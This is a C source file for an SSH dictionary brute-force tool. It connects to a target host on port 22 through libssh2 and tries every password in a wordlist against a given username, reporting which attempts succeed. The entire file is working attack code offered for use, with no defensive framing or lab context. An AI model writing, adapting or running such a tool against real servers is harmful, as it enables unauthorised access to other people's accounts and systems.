#include "status.h"
#include "tcp.h"
#include "lines.h"
#include "ssh.h"
#include <unistd.h>

status_t get_args (const char* (*address),
                   const char* (*username),
                   const char* (*dict_filename),
                   int argc, const char* const* argv)
{
	if (argc != 4)
		return failure (NULL);

	(*address) = argv [1];
	(*username) = argv [2];
	(*dict_filename) = argv [3];
	return success ();
}

status_t bruteforce (int ssh_socket, const char* username, FILE* dict_file)
{
	LIBSSH2_SESSION* session = libssh2_session_init ();
	if (session == NULL)
		return failure ("Failed to initialize an SSH session");
	if (libssh2_session_startup (session, ssh_socket) != 0)
		return sshfailure (session);

	const char* userauth_list = libssh2_userauth_list (session, username, strlen (username));
	if (strstr (userauth_list, "password") == NULL) // TODO: commas
		return failure ("The SSH server does not support passwords");

	line_t line;
	status_t status = make_line (&line);
	if (failed (status))
		return status;

	while (1) {
		status_t status = get_line (&line, dict_file);
		if (failed (status))
			return status;
		if (feof (dict_file))
			return success ();

		const char* password = line.ntbs;
		printf ("Testing \"%s\"... ", password);
		fflush (stdout);
		if (libssh2_userauth_password(session, username, password)<0)
			printf ("failed.\n");
		else
			printf ("success.\n");
	}
}

int main (int argc, const char* const* argv)
{
	const char* address = NULL;
	const char* username = NULL;
	const char* dict_filename = NULL;
	check (get_args (&address, &username, &dict_filename, argc, argv),
	       "Usage: sshpass address username dict_file");

	int ssh_socket = -1;
	check (connect_tcp (&ssh_socket, address, "22"),
	       "Could not connect to %s:%s", address, "22");

	FILE* dict_file = fopen (dict_filename, "r");
	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);

	check (bruteforce (ssh_socket, username, dict_file),
	       "Could not bruteforce ssh:%s@%s", username, address);

	close (ssh_socket);
	fclose (dict_file);
	return EXIT_SUCCESS;
}
